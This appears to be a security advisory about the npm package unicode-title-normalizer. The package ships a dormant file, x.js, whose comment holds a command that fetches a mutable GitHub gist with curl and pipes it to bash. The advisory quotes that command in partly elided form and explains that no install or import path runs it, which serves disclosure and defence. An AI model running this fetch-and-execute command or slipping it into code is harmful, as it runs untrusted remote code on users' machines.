summary: unicode-title-normalizer ships dormant file embedding a remote-gist curl|bash command in a comment
details: The package ships x.js (listed in the files array) whose JavaScript comment body contains a shell command-substitution `$(curl -s https://api.github.com/gists/da04f14c93acbe9a7aef827be0a2e91c |... | bash)` placed next to a `console.log("hello world")`. The file is not referenced by package.json main, bin, tests, or any lifecycle script (preinstall/install/postinstall/prepare are absent), and the library entry point does not import it, so neither `npm install` nor `require('unicode-title-normalizer')` executes the construct. The payload fires only if a developer copies the comment contents into a shell. The embedded command fetches an unpinned, mutable GitHub gist and pipes it to bash, which is a hostile-shaped construct even though no automatic installer code path reaches it.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
